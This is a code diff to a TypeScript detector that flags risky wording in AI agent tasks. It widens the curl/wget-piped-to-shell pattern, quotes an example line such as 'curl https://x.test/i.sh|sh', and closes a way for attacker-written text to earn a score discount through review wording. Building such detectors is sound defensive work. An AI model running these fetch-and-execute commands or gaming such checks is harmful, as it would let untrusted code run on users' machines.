@@ -132,6 +132,13 @@ const NA = "(?![a-z0-9])";
 const NOUN_BEFORE =
   "(?<!(?:the|a|an|this|that|its|their|his|her|my|your|our|latest|last|first|next|new|each|every|blog|forum) )";
 
+/**
+ * "| sh", "|sudo -E bash", "| env sh", "| /usr/bin/env bash", "| /bin/sh": a pipe into an
+ * interpreter. Every optional part starts with its own literal, so the pattern stays linear.
+ */
+const BIN_DIR = "/(?:usr/)?(?:local/)?bin/";
+const PIPE_TO = `\\|\\s*(?:sudo\\s+(?:-[a-z]{1,4}\\s+){0,3})?(?:(?:${BIN_DIR})?env\\s+)?(?:${BIN_DIR})?`;
+
 const LOCAL_URL =
   /^https?:\/\/(?:localhost|127\.|0\.0\.0\.0|\[::1\]|[a-z0-9-]+\.local[:/]|10\.|192\.168\.)/;
 /**
@@ -143,7 +150,12 @@ const LOCAL_URL =
  */
 const HOST_START = "(?<![a-z0-9@._/\\\\-])[a-z0-9][a-z0-9-]{0,62}";
 const HOST_END = "(?![a-z0-9_-]|\\.[a-z0-9])";
-const HOST_PATH = `[/?#][^\\s<>"')\\]]{0,200}`;
+/**
+ * A character of a URL's path or query. A shell pipe, a `;` and a backtick end the URL, so in
+ * "curl https://x.test/i.sh|sh" blankUrls leaves the "|sh" for the fetch-exec pattern.
+ */
+const URL_CHAR = "[^\\s<>\"')\\]|;`]";
+const HOST_PATH = `[/?#]${URL_CHAR}{0,200}`;
 const HOST_TLD =
   "(?:\\.com|\\.net|\\.org|\\.gov|\\.edu|\\.io|\\.dev|\\.app|\\.co|\\.ai|\\.xyz|\\.info|\\.biz|\\.cloud|\\.site|\\.online|\\.tech|\\.test|\\.invalid)";
 const BARE_HOST =
@@ -151,7 +163,7 @@ const BARE_HOST =
   `|${HOST_START}(?:\\.com|\\.net|\\.org|\\.gov|\\.edu)${HOST_END}(?:${HOST_PATH})?` +
   `|${HOST_START}${HOST_TLD}${HOST_END}${HOST_PATH}`;
 const URL_RE = new GatedRegExp(
-  `${/https?:\/\/[^\s<>"')\]]{3,200}|www\.[a-z0-9-]{2,60}\.[a-z]{2,}(?:[/?#][^\s<>"')\]]{0,200})?/.source}|${BARE_HOST}`,
+  `https?://${URL_CHAR}{3,200}|www\\.[a-z0-9-]{2,60}\\.[a-z]{2,}(?:${HOST_PATH})?|${BARE_HOST}`,
   "g",
 );
 
@@ -249,24 +261,32 @@ const P = {
     `${NB}(?:claude mcp add|mcp add|add (?:an? |the )?(?:remote )?mcp(?: server)?|install (?:an? |the )?mcp|new mcp server|connect (?:to )?(?:an? )?(?:remote )?mcp|claude plugin install|plugin install|plugin marketplace add|marketplace add|add (?:an? |the )?plugin|install (?:an? |the )?plugin)${NA}`,
   ),
   pipeShell: re(
-    `(?:curl|wget|fetch|iwr|invoke-webrequest)[^\\n|]{0,160}\\|\\s*(?:sudo\\s+)?(?:ba|z|da|k)?sh${NA}|(?:curl|wget)[^\\n|]{0,160}\\|\\s*(?:sudo\\s+)?(?:python3?|node|perl|ruby|php)${NA}|${NB}(?:bash|sh|zsh|source) <\\(\\s*(?:curl|wget)|${NB}iex\\s*\\(?\\s*(?:iwr|irm|invoke-)`,
+    `(?:curl|wget|fetch|iwr|invoke-webrequest)[^\\n|]{0,160}${PIPE_TO}(?:ba|z|da|k)?sh${NA}|(?:curl|wget)[^\\n|]{0,160}${PIPE_TO}(?:python3?|node|perl|ruby|php)${NA}|${NB}(?:bash|sh|zsh|source) <\\(\\s*(?:curl|wget)|${NB}iex\\s*\\(?\\s*(?:iwr|irm|invoke-)`,
   ),
   remoteExec: re(
     `${NB}(?:npx|bunx|uvx|pnpm dlx)\\s+(?:(?:-y|--yes|--from)\\s+|@[a-z0-9._-]+/|github:|git\\+|https?://|${URL_MARK})`,
   ),
   installScriptAnchor: g(`${NB}install(?:ation)? (?:script|command|one-?liner)`),
-  // Genuine review wording only: a bare "prevent", "detect" or "harden" is not one, and attacker
-  // text must not be able to halve its own cues with it.
+  // Genuine review wording only: a bare "prevent", "detect" or "harden" is not one, nor is the noun
+  // "audit log". Anyone can write these words, so they are trusted only so far: extractAll takes
+  // them from the task's own text alone (never an agent or role description) and drops them when
+  // any text has an intent cue, and score.ts lets them lower the score but never remove a floor.
   // Not inside an address or a path: "audit@mail.example" or "/audit/" is no review.
   review: re(
-    `(?<![a-z0-9@._/-])(?:audit(?:s|ed|ing)?|pen-?test(?:s|ing)?|threat model(?:s|ing)?|(?:check|make sure|ensure|verify) (?:that |whether |if )?(?:we|it|nothing|no one|nobody) (?:don'?t|do not|never|doesn'?t|does not|cannot|can'?t|isn'?t|is not|won'?t|will not)|security (?:review|audit|test|check)s?)(?![a-z0-9@_/-])`,
+    `(?<![a-z0-9@._/-])(?:audit(?:s|ed|ing)?(?! (?:logs?|trails?|events?|entry|entries|records?|tables?)${NA})|pen-?test(?:s|ing)?|threat model(?:s|ing)?|(?:check|make sure|ensure|verify) (?:that |whether |if )?(?:we|it|nothing|no one|nobody) (?:don'?t|do not|never|doesn'?t|does not|cannot|can'?t|isn'?t|is not|won'?t|will not)|security (?:review|audit|test|check)s?)(?![a-z0-9@_/-])`,
   ),
-  // review / scan for / test(s) for|that / write tests: counts only with a security noun after it
-  reviewAnchor: g(
-    `${NB}(?:review(?:s|ed|ing)?|scan(?:s|ning)? for|tests? (?:for|that)|testing (?:for|that)|write (?:a |unit |the )?tests?)${NA}`,
-  ),
+  // review / scan for: counts only with a security noun after it
+  reviewAnchor: g(`${NB}(?:review(?:s|ed|ing)?|scan(?:s|ning)? for)${NA}`),
   reviewFor: re(
     `(?:secrets?|vulnerab|inject|leak|exfil|malicious|credential|security|unsafe|backdoor|exploit|cve-|tokens?|passwords?|api keys?|xss|csrf|ssrf|pii)`,
+  ),
+  // test(s) for|that / write tests: only with a flaw after it. Testing the token refresh or the
+  // password form is ordinary feature work, not a review.
+  testAnchor: g(
+    `${NB}(?:tests? (?:for|that)|testing (?:for|that)|write (?:a |unit |the )?tests?)${NA}`,
+  ),
+  testFor: re(
+    `(?:vulnerab|inject|leak|exfil|malicious|unsafe|backdoor|exploit|cve-|xss|csrf|ssrf|security (?:bugs?|holes?|issues?|flaws?|problems?|regressions?))`,
   ),
   // intent (OWASP ASI01)
   ignore: re(
@@ -510,8 +530,14 @@ export function extractSignals(input: string, opts: SignalOptions = {}): TextSig
     if (P.disable.test(text)) i.add("disable-safeguards");
     if (conceal) i.add("conceal");
 
-    // Review wording halves the text cues (score.ts), so text with an attacker's intent never gets it.
-    if (i.size === 0 && (P.review.test(text) || near(text, P.reviewAnchor, P.reviewFor)))
+    // Review wording halves the text cues in the score (score.ts), so text with an attacker's
+    // intent never gets it. extractAll applies the same rule across texts.
+    if (
+      i.size === 0 &&
+      (P.review.test(text) ||
+        near(text, P.reviewAnchor, P.reviewFor) ||
+        near(text, P.testAnchor, P.testFor))
+    )
       c.add("review-context");
 
     return {
@@ -524,21 +550,37 @@ export function extractSignals(input: string, opts: SignalOptions = {}): TextSig
   }
 }
 
-/** Cues of several texts (title, detail, description) merged; each is read within its own cap. */
+/**
+ * Cues of several texts merged; each is read within its own cap. `task` is the task's own text
+ * (title, detail, the call's description and prompt); `context` is other text the cues are read
+ * from, such as an agent's or role's description. That text is committed to the repository, so
+ * anyone who can change it could write review wording there: its review wording never counts.
+ * Review wording from the task counts only when no text, task or context, has an intent cue.
+ */
 export function extractAll(
-  texts: ReadonlyArray<string | undefined>,
+  task: ReadonlyArray<string | undefined>,
   opts: SignalOptions = {},
+  context: ReadonlyArray<string | undefined> = [],
 ): TextSignals {
   const c = new Set<CueId>();
   const i = new Set<IntentCueId>();
   let truncated = false;
-  for (const t of texts) {
-    if (!t) continue;
-    const s = extractSignals(t, opts);
-    for (const x of s.cues) c.add(x);
-    for (const x of s.intent) i.add(x);
-    truncated ||= s.truncated;
-  }
+  let review = false;
+  const read = (texts: ReadonlyArray<string | undefined>, own: boolean): void => {
+    for (const t of texts) {
+      if (!t) continue;
+      const s = extractSignals(t, opts);
+      for (const x of s.cues) {
+        if (x === "review-context") review ||= own;
+        else c.add(x);
+      }
+      for (const x of s.intent) i.add(x);
+      truncated ||= s.truncated;
+    }
+  };
+  read(task, true);
+  read(context, false);
+  if (review && i.size === 0) c.add("review-context");
   return {
     cues: CUE_IDS.filter((x) => c.has(x)),
     intent: INTENT_CUE_IDS.filter((x) => i.has(x)),
